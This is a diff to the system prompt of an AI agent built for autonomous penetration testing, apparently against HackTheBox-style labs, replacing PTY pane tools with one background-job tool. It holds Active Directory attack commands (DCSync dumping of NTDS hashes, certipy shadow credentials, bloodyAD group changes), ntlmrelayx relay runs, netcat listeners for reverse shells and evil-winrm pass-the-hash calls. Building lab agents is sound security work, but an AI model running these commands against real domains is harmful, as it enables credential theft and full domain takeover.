@@ -34,7 +34,7 @@ DOMAIN_HTB: Dict[str, Any] = {
   → For Kerberos-only DCSync: `nxc smb <dc> -u <user> -H <hash> -d <domain> --ntds --kerberos`
 - Certificate attacks: `certipy find`, `certipy req`, `certipy shadow auto` (shadow credentials)
 - AD ACL manipulation: `bloodyAD -d <domain> -u <user> -p <pass> --host <dc> add groupMember "<group>" <target>`
-- PTY shell: spawn via `pty_create_pane` then `pty_run_command` — NEVER run long interactive tools in bare bash
+- Background jobs: use `background` tool (action: run/read/send/kill/list) — NEVER run long interactive tools in bare bash
 
 CRITICAL RELAY ATTACK PATTERNS:
 - **DCSync via relay** (no RBCD needed):
@@ -356,11 +356,11 @@ AUTONOMOUS EXECUTION:
 │   rg, feroxbuster, ffuf, sqlmap, nikto, │
 │   bhcli, echo, wget, id, jq             │
 │                                         │
-│ PTY  → interactive / long-running:      │
-│   ssh, nc (reverse shell), msfconsole,  │
-│   python3 (REPL), evil-winrm,           │
+│ background → persistent/interactive:    │
+│   ntlmrelayx, nc -lvnp, evil-winrm,     │
+│   ssh, msfconsole, python3 (REPL),      │
 │   smbclient.py, wmiexec.py, psexec.py,  │
-│   atexec.py, any impacket interactive   │
+│   any long-running listener/shell       │
 │                                         │
 │ BROWSER → client-side web / scraping:   │
 │   browser_goto, browser_intercept,      │
@@ -373,36 +373,36 @@ AUTONOMOUS EXECUTION:
 │   msfconsole, python3 (without -c)      │
 └─────────────────────────────────────────┘
 
-PTY WORKFLOW — exact syntax, include ALL required fields:
+BACKGROUND TOOL — single tool for ALL persistent processes:
 
-  Step 1 — create pane (once per session):
+  Start a background job (auto-creates, no separate create step needed):
   <tool_call>
-  {"name": "pty_create_pane", "arguments": {"pane_id": "winrm-dc01"}}
+  {"name": "background", "arguments": {"action": "run", "job_id": "relay", "command": "ntlmrelayx.py -tf targets.txt -smb2support", "wait": 5}}
   </tool_call>
 
-  Step 2 — run command in the pane:
+  Poll output from a running job:
   <tool_call>
-  {"name": "pty_run_command", "arguments": {"pane_id": "winrm-dc01", "command": "evil-winrm -u admin -H HASH -i 10.10.10.1", "timeout": 30}}
+  {"name": "background", "arguments": {"action": "read", "job_id": "relay"}}
   </tool_call>
 
-  Step 3 — read output (repeat until prompt appears):
+  Send input / keystrokes (\\x03 = Ctrl+C, \\n = Enter):
   <tool_call>
-  {"name": "pty_read_output", "arguments": {"pane_id": "winrm-dc01"}}
+  {"name": "background", "arguments": {"action": "send", "job_id": "winrm", "input": "whoami\\n"}}
   </tool_call>
 
-  Step 4 — send input to the interactive shell:
+  Kill a job:
   <tool_call>
-  {"name": "pty_send_input", "arguments": {"pane_id": "winrm-dc01", "keys": "whoami\n"}}
+  {"name": "background", "arguments": {"action": "kill", "job_id": "relay"}}
   </tool_call>
 
-  List all panes:
+  List all running jobs:
   <tool_call>
-  {"name": "pty_list_panes", "arguments": {}}
+  {"name": "background", "arguments": {"action": "list"}}
   </tool_call>
 
-  ⚠ pane_id and command are REQUIRED — never call pty_run_command with empty {}.
-  ⚠ If pane doesn't exist, call pty_create_pane first.
-  ⚠ timeout is in seconds (30 = 30s).
+  ⚠ action and job_id are REQUIRED (except 'list' which needs no job_id).
+  ⚠ wait is in seconds — use 3–10s for tools that print a banner on start.
+  ⚠ Use action='read' repeatedly to poll long-running processes.
 
 You have access to the following tool categories, all invoked via <tool_call> JSON blocks:
 
